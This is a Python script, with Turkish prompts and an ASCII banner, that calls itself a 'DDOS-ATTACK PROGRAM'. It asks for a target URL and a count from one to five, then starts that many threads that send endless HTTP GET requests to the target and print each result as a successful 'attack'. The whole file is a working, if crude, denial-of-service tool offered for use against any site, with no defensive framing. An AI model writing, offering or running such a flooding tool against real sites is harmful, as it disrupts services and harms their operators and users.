import requests
from threading import  Thread
import time

banner = """
   █████████       █████                                             
  ███░░░░░███     ░░███                                              
 ░███    ░███   ███████   ██████   █████████████                     
 ░███████████  ███░░███  ░░░░░███ ░░███░░███░░███                    
 ░███░░░░░███ ░███ ░███   ███████  ░███ ░███ ░███                    
 ░███    ░███ ░███ ░███  ███░░███  ░███ ░███ ░███                    
 █████   █████░░████████░░████████ █████░███ █████                   
░░░░░   ░░░░░  ░░░░░░░░  ░░░░░░░░ ░░░░░ ░░░ ░░░░░                    
                                                                     
                                                                     
                                                                     
  █████████                   ███   █████    █████      █████   █████
 ███░░░░░███                 ░░░   ░░███    ░░███      ░░███   ░░███ 
░███    ░░░  █████████████   ████  ███████   ░███████   ░███    ░███ 
░░█████████ ░░███░░███░░███ ░░███ ░░░███░    ░███░░███  ░███████████ 
 ░░░░░░░░███ ░███ ░███ ░███  ░███   ░███     ░███ ░███  ░███░░░░░███ 
 ███    ░███ ░███ ░███ ░███  ░███   ░███ ███ ░███ ░███  ░███    ░███ 
░░█████████  █████░███ █████ █████  ░░█████  ████ █████ █████   █████
 ░░░░░░░░░  ░░░░░ ░░░ ░░░░░ ░░░░░    ░░░░░  ░░░░ ░░░░░ ░░░░░   ░░░░░ 
                                                                                                                                                                                                 
"""
print(banner)
print("""
>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
WELCOME DDOS-ATTACK PROGRAM
developer AdamSmithH
>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>

""")
print("Lütfen Bekleyiniz programa yönlendiriliyorsunuz.")
time.sleep(3)
url = input (">>>Target URL: ")
islemler = """
----------------------------------------------------------------
saniyede göndermek istediginiz saldırı  sayısını giriniz (max:5)
----------------------------------------------------------------

"""
print(islemler)
thread= input (">>>ATTACK NUMBER : ")


if thread == "1":
    print("Saldırı başlıyor")
    time.sleep(1)
    print("3")
    time.sleep(1)
    print("2")
    time.sleep(1)
    print("1")
    print("Başarılar :)")
    def islem1 ():
        while True:

            bomb  = requests.get(url)
            sonuc = bomb.status_code
            yazi = "{} Saldırısı başarılı - {}".format(url,sonuc)
            print(yazi)
    t1 = Thread(target=islem1)
    t1.start()
elif thread == "2":
    print("Saldırı başlıyor")
    time.sleep(1)
    print("3")
    time.sleep(1)
    print("2")
    time.sleep(1)
    print("1")
    print("Başarılar :)")
    def islem2 ():
        while True:

            bomb  = requests.get(url)
            sonuc = bomb.status_code
            yazi = "{} Saldırısı başarılı - {}".format(url,sonuc)
            print(yazi)
    t1 = Thread(target=islem2)
    t1.start()
    t2 = Thread(target=islem2)
    t2.start()
elif thread == "3":
    print("Saldırı başlıyor")
    time.sleep(1)
    print("3")
    time.sleep(1)
    print("2")
    time.sleep(1)
    print("1")
    print("Başarılar :)")
    def islem3 ():
        while True:

            bomb  = requests.get(url)
            sonuc = bomb.status_code
            yazi = "{} Saldırısı başarılı - {}".format(url,sonuc)
            print(yazi)
    t1 = Thread(target=islem3)
    t1.start()
    t2 = Thread(target=islem3)
    t2.start()
    t3 = Thread(target=islem3)
    t3.start()
elif thread == "4":
    print("Saldırı başlıyor")
    time.sleep(1)
    print("3")
    time.sleep(1)
    print("2")
    time.sleep(1)
    print("1")
    print("Başarılar :)")
    def islem4 ():
        while True:

            bomb  = requests.get(url)
            sonuc = bomb.status_code
            yazi = "{} Saldırısı başarılı - {}".format(url,sonuc)
            print(yazi)
    t1 = Thread(target=islem4)
    t1.start()
    t2 = Thread(target=islem4)
    t2.start()
    t3 = Thread(target=islem4)
    t3.start()
    t4 = Thread(target=islem4)
    t4.start()
elif thread == "5":
    print("Saldırı başlıyor")
    time.sleep(1)
    print("3")
    time.sleep(1)
    print("2")
    time.sleep(1)
    print("1")
    print("Başarılar :)")
    def islem5():
        while True:

            bomb  = requests.get(url)
            sonuc = bomb.status_code
            yazi = "{} Saldırısı başarılı - {}".format(url,sonuc)
            print(yazi)
    t1 = Thread(target=islem5)
    t1.start()
    t2 = Thread(target=islem5)
    t2.start()
    t3 = Thread(target=islem5)
    t3.start()
    t4 = Thread(target=islem5)
    t4.start()
    t5 = Thread(target=islem5)
    t5.start()